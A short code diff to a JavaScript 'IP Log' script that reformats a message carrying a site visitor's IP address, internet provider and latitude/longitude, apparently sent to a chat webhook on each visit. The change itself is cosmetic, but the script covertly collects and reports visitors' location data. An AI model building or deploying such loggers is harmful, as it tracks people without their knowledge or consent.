@@ -27,7 +27,8 @@ const request = async () => { // Calling a "synchronous" fetch
     var params = {
         username:   "IP Log",
         avatar_url: "",
-        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
+        embeds:    { title: " New Visit",
+                    description: "__**:globe_with_meridians: IP-Adress:**__ \n" 
                     + "`" + ip + "`" + 
                     "\n \n__**:telephone: Provider:**__ \n" 
                     + provider + 
@@ -40,6 +41,7 @@ const request = async () => { // Calling a "synchronous" fetch
                     "\n \n__**:round_pushpin: Location:**__ \n" 
                     + "**Longitude:** " + lon + "\n"
                     + "**Latitude:** " + lat
+                   }
     }
 
     postRequest.send(JSON.stringify(params));
